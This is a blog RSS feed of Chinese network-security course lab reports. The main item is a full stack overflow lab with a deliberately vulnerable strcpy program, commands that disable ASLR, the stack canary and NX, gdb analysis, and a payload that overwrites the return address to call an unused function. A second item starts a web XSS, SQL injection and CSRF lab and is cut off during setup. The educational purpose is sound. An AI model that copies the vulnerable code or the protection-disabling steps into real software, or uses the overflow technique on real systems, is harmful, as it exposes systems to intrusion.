<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Hexo • Posts by &#34;网安导论实验&#34; category</title>
        <link>https://enjundu.github.io</link>
        <description></description>
        <language>en</language>
        <pubDate>Wed, 03 Jul 2024 16:02:48 +0800</pubDate>
        <lastBuildDate>Wed, 03 Jul 2024 16:02:48 +0800</lastBuildDate>
        <category>Hexo</category>
        <category>Front Matter</category>
        <category>code</category>
        <category>homework</category>
        <category>recommendation</category>
        <item>
            <guid isPermalink="true">https://enjundu.github.io/IntroductiontoNetSecurityLab/%E6%A0%88%E6%BA%A2%E5%87%BA/</guid>
            <title>栈溢出</title>
            <link>https://enjundu.github.io/IntroductiontoNetSecurityLab/%E6%A0%88%E6%BA%A2%E5%87%BA/</link>
            <category>Hexo</category>
            <category>Front Matter</category>
            <pubDate>Wed, 03 Jul 2024 16:02:48 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;栈溢出简单实验enjun-du&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#栈溢出简单实验enjun-du&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VuanVuRHUvSW50cm9kdWN0aW9uLXRvLU5ldC1TZWN1cml0eS1MYWItLS1TdGFjay1PdmVyZmxvdw==&#34;&gt;栈溢出简单实验 ——Enjun Du&lt;/span&gt;&lt;/h1&gt;
&lt;h2 id=&#34;实验分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验分析&#34;&gt;#&lt;/a&gt; 实验分析&lt;/h2&gt;
&lt;h3 id=&#34;实验原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验原理&#34;&gt;#&lt;/a&gt; 实验原理&lt;/h3&gt;
&lt;p&gt;栈被用于实现函数的调用以及存储局部变量，当使用诸如 strcpy、gets 等不安全函数时，攻击者通过向栈中某个变量写入的字节数超过了这个变量本身所申请的字节数，使得数据向高地址存储区域进行覆盖来修改返回地址，最终让程序根据攻击者的想法运行，这种攻击被称为栈溢出攻击&lt;/p&gt;
&lt;h3 id=&#34;实验目的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验目的&#34;&gt;#&lt;/a&gt; 实验目的&lt;/h3&gt;
&lt;p&gt;了解栈溢出攻击原理，并实现简单栈溢出攻击实验&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/2AK37EZWNygmMhw.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;实验思路&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验思路&#34;&gt;#&lt;/a&gt; 实验思路&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;编写程序，在主函数中调用 func_call 函数，但不调用 inject 函数&lt;/li&gt;
&lt;li&gt;在 func_call 函数中使用 strcpy 函数对 param 数组进行赋值&lt;/li&gt;
&lt;li&gt;攻击者通过对程序进行反汇编（可以使用 gdb 工具）查看汇编指令，通过不断修改 input 数组来将 func_call 函数的返回地址覆盖为指定值，最终使 inject 函数被调用&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/olXgCPWuf5FwEmN.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;注意事项&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注意事项&#34;&gt;#&lt;/a&gt; 注意事项&lt;/h3&gt;
&lt;p&gt;为了成功执行攻击，需要关闭 Ubuntu 系统中的一系列保护机制，具体可在终端中输入：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo apt-get install gcc-multilib&lt;/code&gt; ，代表支持交叉编译 cross-compiling，例如可以在 64 位处理器上处理 32 位程序&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo sysctl -w kernel.randomize_va_space=0&lt;/code&gt; ，代表关闭进程空间地址随机化功能&lt;/li&gt;
&lt;li&gt;使用  &lt;code&gt;gcc -Wall -g -o StackOverflow StackOverflow.c -fno-stack-protector -z execstack -m32&lt;/code&gt;  编译程序，其中 - g 代表关闭所有优化机制，-fno-stack-protector 代表关闭 Stack Canary 保护，-z execstack 代表禁用 NX（No-eXecute protect）保护，-m32 代表在编译阶段将编译目标指定为 32 位&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;实验准备solved-by-enjun-du&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验准备solved-by-enjun-du&#34;&gt;#&lt;/a&gt; 实验准备 ——solved by Enjun Du&lt;/h2&gt;
&lt;h3 id=&#34;硬件环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#硬件环境&#34;&gt;#&lt;/a&gt; 硬件环境&lt;/h3&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;磁盘驱动器：NVMe&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;KIOXIA-&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EXCERIA&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G2&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;SSD&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;NVMe&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Micron&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3400 &lt;/span&gt;&lt;span class=&#34;string&#34;&gt;MTFDKBA1TOTFH&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;显示器：NVIDIA&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;GeForce&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;RTX&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3070 &lt;/span&gt;&lt;span class=&#34;string&#34;&gt;Ti&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Laptop&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;GPU&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;系统型号&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;ROG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Strix&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G533ZW_G533ZW&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;系统类型&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;基于&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;x64&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;的电脑&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;处理器&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;12th&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Gen&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Intel(R)&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Core(TM)&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;i9-12900H，2500&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Mhz，14&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;个内核，20&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;个逻辑处理器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;BIOS&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;版本/日期&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;American&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Megatrends&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;International,&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;LLC.&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G533ZW.324,&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;/2/21&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;BIOS&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;模式&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;UEFI&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;主板产品&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;G533ZW&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;操作系统名称&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;家庭中文版&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;软件环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#软件环境&#34;&gt;#&lt;/a&gt; 软件环境&lt;/h3&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;VMware&lt;/span&gt; Workstation Pro&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Ubuntu&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;04&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; LTS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Red&lt;/span&gt; Panda Dev-C++&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;开始实验&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#开始实验&#34;&gt;#&lt;/a&gt; 开始实验&lt;/h2&gt;
&lt;h3 id=&#34;实验代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验代码&#34;&gt;#&lt;/a&gt; 实验代码&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; input[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;11112222333344445555666677778888&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;*****inject success*****\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;func_call&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; param[&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(param,input);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc,&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;** argv)&lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; func_call();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;main exit...\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;\1. 首先在 dev 上编辑 C 语言代码 StackOverflow.c 如上&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接下来为了成功执行攻击，需要关闭 Ubuntu 系统中的一系列保护机制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在命令行运行 cd /home/sky/Desktop 将地址定位在目标文件层&lt;/li&gt;
&lt;li&gt;在终端输入 sudo apt-get install gcc-multilib，代表支持交叉编译 cross-compiling，例如可以在 64 位处理器上处理 32 位程序&lt;/li&gt;
&lt;li&gt;在终端输入 sudo sysctl -w kernel.randomize_va_space=0，代表关闭进程空间地址随机化功能&lt;/li&gt;
&lt;li&gt;使用 gcc -Wall -g -o StackOverflow StackOverflow.c -fno-stack-protector -z execstack -m32 编译程序，其中 - g 代表关闭所有优化机制，-fno-stack-protector 代表关闭 Stack Canary 保护，-z execstack 代表禁用 NX（No-eXecute protect）保护，-m32 代表在编译阶段将编译目标指定为 32 位&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对程序分析可知，其将在第 15 行执行输出操作，故我们将断点设置在 15 行。接下来使用 gdb 程序对该代码进行调试&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;首先使用如下代码安装 gdb&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt update&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install gdb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在终端输入 gdb StackOverflow 开启调试&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/2VIume3T1Pswky7.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;根据分析代码，我们发现关键代码在 13 行，故在 13 行设置断点。我们输入命令：break  13。&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/B8HCPynamgcQ3zu.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后输入命令 run 代表运行程序至断点处&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/A43gNRu1Utl7soC.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输入 disassemble 后回车&lt;br&gt;
结果如下：&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/cxNOVuQGhe51JoE.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
&lt;strong&gt;=&amp;gt; 这一行即为断点（13 行) 的步骤行。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输入 info registers ebp esp 来查看寄存器里的栈顶指针和栈底指针&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/GxSRyAmla2YPipD.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后输入 print&amp;amp;param 来查看 param 数组的首地址&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/QakZYVf8OUgPB5d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;\9. 输入  &lt;code&gt;x/2xw 0xffffd1a8&lt;/code&gt;  来查看该 func_call 函数的返回地址，在这个命令中，“x” 是一个 GDB 命令，它是 “examine memory” 的缩写，用于检查内存中的内容。&amp;quot;/2xw&amp;quot; 是一个格式化参数，它告诉 GDB 以十六进制格式显示两个字（32 位）的内容，并将其解释为一个有符号整数。“0xffffd1a8” 是内存地址，表示我们要查看的内存位置。&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/CDNmOWRhMsgGv7o.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后输入 disassemble main 来反汇编 main 函数。&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/gCpST7F5xnJcZID.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以看到 func_cal 函数的&lt;strong&gt;返回地址 0x565556c6 指向 main 函数里的 &amp;lt;+31&amp;gt;，其 and 所指的位置是 &amp;lt;+4&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输入 print&amp;amp;inject 来查看 inject 函数的地址&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/ZNlgi465YJwDSnQ.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	现在我们分析所获取到的信息：func_cal 函数的返回地址为 0xffffd1ac（0xffffd1a8+0x4），。param 的首地址为 0xffffd190, 两者相差 28 个字节。查看到 inject 函数地址为 0x5655554d, 因此可以将 input 输入更改为 “28 个字节 + 4 位 inject 地址”。故将 input 修改为 char input [] = “AAAAABBBBBCCCCCDDDDDEEEEEFFF\x4d\x55\x55\x56”; 后重新编译程序&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在代码中修改 input 后重新编译程序&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/HETBnRgaZQFiXGf.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;如上图所示攻击完成&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#如上图所示攻击完成&#34;&gt;#&lt;/a&gt; 如上图所示，攻击完成。&lt;/h3&gt;
&lt;h2 id=&#34;结论和体会&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#结论和体会&#34;&gt;#&lt;/a&gt; 结论和体会&lt;/h2&gt;
&lt;p&gt;​	在本次实验中，我深入了解并实践了栈溢出攻击的原理与技术。通过设计和实施一个简单的栈溢出攻击，我不仅加深了对程序内存布局和操作系统安全机制的理解，还学会了如何在实际环境中利用软件漏洞。&lt;/p&gt;
&lt;p&gt;​	实验的过程中，我首先在 Ubuntu 系统下编写了一个简单的 C 程序，该程序包含了易受栈溢出攻击的漏洞。通过精心构造输入数据，我成功引导程序执行了未授权的 inject 函数，从而实现了攻击目标。实验过程中，我关闭了操作系统的几项安全保护机制，如地址空间布局随机化（ASLR）、栈保护等，以模拟一个容易受到攻击的环境。&lt;/p&gt;
&lt;p&gt;通过本次实验，我学习到了几个重要的技术和概念：&lt;/p&gt;
&lt;p&gt;​	1. 栈溢出的原理：了解了栈溢出是如何通过覆盖函数的返回地址来控制程序流程的。&lt;/p&gt;
&lt;p&gt;​	2. 安全保护机制的重要性：实验中需要关闭的安全保护机制说明了这些机制在防御栈溢出攻击中的重要作用。&lt;/p&gt;
&lt;p&gt;​	3. 调试和分析工具的应用：通过使用 gdb 调试工具和其它命令行工具，我学会了如何分析程序的内存布局和识别潜在的安全漏洞。&lt;/p&gt;
&lt;p&gt;​	这次实验不仅加强了我的理论知识，也提高了我的实践技能，让我对计算机安全领域有了更深刻的理解。我认识到，编写安全的代码需要程序员具备深厚的安全意识和技能，以及对各种攻击技术和防御策略的熟悉。未来，我希望能够继续深入研究这一领域，为创建更安全的软件环境做出贡献。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://enjundu.github.io/IntroductiontoNetSecurityLab/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/</guid>
            <title>应用安全</title>
            <link>https://enjundu.github.io/IntroductiontoNetSecurityLab/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/</link>
            <category>Hexo</category>
            <category>Front Matter</category>
            <pubDate>Wed, 03 Jul 2024 15:32:28 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;应用安全蓝天&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#应用安全蓝天&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VuanVuRHUvSW50cm9kdWN0aW9uLXRvLUN5YmVyc2VjdXJpdHktTGFiLS0tQXBwbGljYXRpb24tU2VjdXJpdHk=&#34;&gt;应用安全 —— 蓝天 °&lt;/span&gt;&lt;/h1&gt;
&lt;h2 id=&#34;实验介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验介绍&#34;&gt;#&lt;/a&gt; 实验介绍&lt;/h2&gt;
&lt;h3 id=&#34;实验原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验原理&#34;&gt;#&lt;/a&gt; 实验原理&lt;/h3&gt;
&lt;p&gt;​	大多数 Web 应用程序攻击都是来源于 XSS、CSRF 和 SQL 注入攻击，这些攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序，其中 CSRF 存在是指攻击者构建的恶意网站被用户访问后，返回一些攻击性代码，并发出一个请求要求访问第三方站点，从而盗用用户身份，如用户名义发送邮件、虚拟货币转账等&lt;/p&gt;
&lt;h3 id=&#34;实验目的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验目的&#34;&gt;#&lt;/a&gt; 实验目的&lt;/h3&gt;
&lt;p&gt;实现本地 Web 攻击和防御&lt;/p&gt;
&lt;h3 id=&#34;实验步骤建议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验步骤建议&#34;&gt;#&lt;/a&gt; 实验步骤建议&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;安装 Flask 框架并启动提供的源代码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;访问网页并实现 XSS 反射型与持久型攻击&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用防御方法，防范 XSS 攻击&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;增加一个登录功能，设计有 SQL 注入隐患的代码，进行攻击，并且展示如何进行防范&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;设计一个 CSRF 攻击范例&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【选做】防御 CSRF 攻击 ——&lt;strong&gt; 如你所见，杜爹当然会做&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;实验步骤细化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验步骤细化&#34;&gt;#&lt;/a&gt; 实验步骤细化&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;安装 Flask 框架并启动提供的源代码&lt;br&gt;
